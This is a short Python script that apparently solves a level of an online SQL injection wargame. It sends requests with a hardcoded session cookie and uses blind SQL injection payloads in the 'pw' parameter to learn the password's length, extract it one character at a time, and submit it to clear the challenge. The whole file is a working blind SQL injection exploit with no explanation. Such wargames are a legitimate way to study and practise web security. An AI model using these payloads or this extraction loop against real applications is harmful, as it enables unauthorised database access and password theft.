import requests

headers={'Cookie': 'PHPSESSID=2t0891ivjv5shc7tpfokfq5pj6'}

url="https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"
choice="789456123qwertyuiopasdfghjklzxcvbnm"
length=0
'''
for i in range(10):
    param="?pw='||length(pw)="+str(i)+"-- -"
    base= url+param
    print (i)
    page=requests.get(base,headers=headers)
    if "Hello admin" in page.text:
        length=i
        print(length)
        break
'''
passwd=''
length=8
for i in range(1,length+1):
    for j in choice:
        param="?pw='||(substr(pw,1,"+str(i)+"))='"+(passwd+j)+"'-- -"
        base=url+param
        page=requests.get(base,headers=headers) 
        print("trying :: "+str(i)+"-_-"+ (passwd+j))
        if "Hello admin" in page.text:
            print(base)
            passwd=passwd+(j)
            print(passwd)
            break

print(passwd)
print("done")

param="?pw="+passwd
base=url+param
page=requests.get(base,headers=headers)
if "Clear" in page.text:
    print("Success:)")
else:
    print("NVM")
